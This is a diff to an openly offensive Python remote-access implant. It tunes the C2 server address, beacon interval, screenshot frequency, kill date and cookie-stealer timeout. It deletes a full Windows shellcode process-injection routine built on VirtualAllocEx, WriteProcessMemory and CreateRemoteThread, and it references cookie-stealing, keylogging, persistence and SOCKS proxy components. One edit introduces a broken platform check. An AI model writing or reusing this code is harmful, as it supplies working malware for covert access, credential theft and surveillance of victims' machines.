@@ -69,6 +69,9 @@ try:
     from Crypto.Util.Padding import pad, unpad
     import requests
     import pyautogui
+    if platform.system() == 'Windows':
+        import winreg
+        from ctypes import wintypes
     import shutil
     import ctypes
     import psutil
@@ -82,10 +85,7 @@ try:
     import websocket
     import tempfile
     import multiprocessing
-    if platform.system() == 'Windows':
-       import winreg
-       from ctypes import wintypes
-    
+  
     
     print("All modules imported successfully!")
 except ImportError as e:
@@ -99,18 +99,18 @@ except ImportError as e:
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://10.10.8.3"
+        self.C2_SERVER = "https://192.168.147.1"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        self.CHECKIN_INTERVAL = 10
+        self.CHECKIN_INTERVAL = 17
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
         self.TAKE_SCREENSHOTS = True
-        self.SCREENSHOT_FREQUENCY = 10
-        self.KILLDATE_ENABLED = False
-        self.KILLDATE = "" if False else ""
+        self.SCREENSHOT_FREQUENCY = 30
+        self.KILLDATE_ENABLED = True
+        self.KILLDATE = "2025-05-16 09:30" if True else ""
 
 # ======================
 # Encryption
@@ -173,7 +173,7 @@ class CookieStealer:
         self.logger = logger or self._create_default_logger()
         self.chrome_debug_port = 9222
         self.edge_debug_port = 9223
-        self.timeout = 20
+        self.timeout = 10
         self.unique_domains = set()
         
         # Browser configurations
@@ -937,56 +937,7 @@ class Persistence:
             return {"status": "error", "message": str(e)}
         
 
-# ======================
-# Process Injection
-# ======================
-class ProcessInjector:
-    @staticmethod
-    def inject_shellcode(pid, shellcode):
-        try:
-            PROCESS_ALL_ACCESS = 0x1F0FFF
-            PAGE_EXECUTE_READWRITE = 0x40
-            kernel32 = ctypes.windll.kernel32
-            
-            process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-            if not process:
-                return {"status": "error", "message": f"OpenProcess failed: {kernel32.GetLastError()}"}
-            
-            shellcode_size = len(shellcode)
-            memory = kernel32.VirtualAllocEx(
-                process, 
-                None, 
-                shellcode_size, 
-                0x3000,
-                PAGE_EXECUTE_READWRITE
-            )
-            if not memory:
-                return {"status": "error", "message": f"VirtualAllocEx failed: {kernel32.GetLastError()}"}
-            
-            written = ctypes.c_ulong(0)
-            kernel32.WriteProcessMemory(
-                process, 
-                memory, 
-                shellcode, 
-                shellcode_size, 
-                ctypes.byref(written))
-            
-            thread_id = ctypes.c_ulong(0)
-            kernel32.CreateRemoteThread(
-                process, 
-                None, 
-                0, 
-                memory, 
-                None, 
-                0, 
-                ctypes.byref(thread_id))
-            
-            return {
-                "status": "success", 
-                "message": f"Injected into PID {pid}, Thread ID {thread_id.value}"
-            }
-        except Exception as e:
-            return {"status": "error", "message": str(e)}
+
 
 # ======================
 # SOCKS5 Proxy
@@ -1129,7 +1080,7 @@ class Keylogger:
 # ======================
 # Shellcode-Runner
 # ======================
-if platform.system() == 'Windows':
+if platform.system == 'Windows':
     class ShellcodeRunner:
         # Initialize Windows DLL
         kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
@@ -1476,10 +1427,11 @@ class Agent:
             "hostname": platform.node(),
             "username": os.getlogin(),
             "os": platform.platform(),
-            "privilege": "admin" if (platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin()) or (platform.system() != 'Windows' and os.getuid() == 0) 
-    else "user",
+            "privilege": "admin" if (platform.system() == 'Windows' and ctypes.windll.shell32.IsUserAnAdmin()) or (platform.system() != 'Windows' and os.getuid() == 0)  else "user",
             "ip": requests.get('https://api.ipify.org', timeout=5).text,
-            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
+            "checkin_interval": self.config.CHECKIN_INTERVAL,  
+            "killdate": self.config.KILLDATE if self.config.KILLDATE_ENABLED else None  
         }
 
         if not self._initial_checkin or (time.time() - self._initial_checkin) > 86400:
